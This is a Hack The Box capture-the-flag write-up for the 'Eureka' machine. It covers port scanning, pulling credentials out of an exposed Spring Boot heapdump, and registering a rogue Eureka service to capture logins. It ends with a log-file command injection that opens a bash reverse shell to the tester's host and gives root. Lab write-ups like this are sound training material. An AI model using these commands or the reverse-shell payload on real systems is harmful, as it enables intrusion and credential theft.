https://github.com/Artemisxxx37/htb-writeups/tree/main/eureka

nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-02 11:16 EDT
Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 18.04% done; ETC: 11:18 (0:01:40 remaining)
Warning: 10.129.232.59 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.232.59
Host is up (0.024s latency).
Not shown: 65460 closed tcp ports (reset), 72 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
8761/tcp open  http    Apache Tomcat (language: en)
|_http-title: Site doesn't have a title.
| http-auth: 
| HTTP/1.1 401 \x0D
|_  Basic realm=Realm
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   27.03 ms 10.10.14.1
2   27.32 ms 10.129.232.59

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 536.12 seconds







# It is java page, that's why we will use Java-Spring-Boot.txt.
ffuf -u http://furni.htb/FUZZ  -w /usr/share/wordlists/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt

#shows a lot of exposed files in /actuator/* directory.

# Download
wget http://furni.htb/actuator/heapdump

# Using strings and grep we got password of user oscar
strings heapdump |grep "password="

password=0sc@r190_S0l!dP@sswd, user=oscar190

# We also get another username password
strings heapdump |grep PWD

http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/!

-----------------
# SSH Port Forward 8761 to yourself
ssh -L 8761:localhost:8761 oscar190@$ip

3306 = mysql















We couldn't crack the passwords.

---------------------------
# Login
http://localhost:8761


I run this first but didn't work.
curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@127.0.0.1:8761/eureka/apps/USER-MANAGEMENT-SERVICE -H 'Content-Type: application/json' -d '{
"instance": {
"instanceId": "USER-MANAGEMENT-SERVICE",
"hostName": "10.10.14.98",
"app": "USER-MANAGEMENT-SERVICE",
"ipAddr": "10.10.14.98",
"vipAddress": "USER-MANAGEMENT-SERVICE",
"secureVipAddress": "USER-MANAGEMENT-SERVICE",
"status": "UP",
"port": { "$": 8081, "@enabled": "true" },
"dataCenterInfo": {
"@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
"name": "MyOwn"
}
}
}'
So I put 2 in USER-MANAGEMENT-SERVICE and run again and it worked. I can't explain why.
curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@127.0.0.1:8761/eureka/apps/USER-MANAGEMENT-SERVICE2 -H 'Content-Type: application/json' -d '{"instance": {"instanceId": "USER-MANAGEMENT-SERVICE2","hostName": "10.10.14.98","app": "USER-MANAGEMENT-SERVICE2","ipAddr": "10.10.14.98","vipAddress": "USER-MANAGEMENT-SERVICE2","secureVipAddress": "USER-MANAGEMENT-SERVICE2","status": "UP","port": { "$": 8081, "@enabled": "true" },"dataCenterInfo": {"@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo","name": "MyOwn"}}}'
![image](https://github.com/user-attachments/assets/aac0cfa4-5f6b-4cb1-8ffe-03d5108cac7d)
![image](https://github.com/user-attachments/assets/fc1f9ce3-1f7c-47f2-b313-8b6e5577df5b)


username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve

# Url decode
username=miranda.wise@furni.htb&password=IL!veT0Be&BeT0L0ve

# I tried with 'miranda.wise', it didn't work.
sshpass -p 'IL!veT0Be&BeT0L0ve' ssh -o StrictHostKeyChecking=no miranda.wise@$ip

![image](https://github.com/user-attachments/assets/d657f724-aac4-4b18-ac92-c04f4663ea14)


# The correct username is 'miranda-wise'
sshpass -p 'IL!veT0Be&BeT0L0ve' ssh -o StrictHostKeyChecking=no miranda-wise@$ip

rm -f /var/www/web/user-management-service/log/application.log;echo 'HTTP Status: x[$(/bin/bash -i >& /dev/tcp/10.10.14.98/9001 0>&1)]' >/var/www/web/user-management-service/log/application.log

# Wait for two minutes for rev shell.
We are root!


![image](https://github.com/user-attachments/assets/48d817fc-9d90-4fc3-8844-9c6bc7d08489)
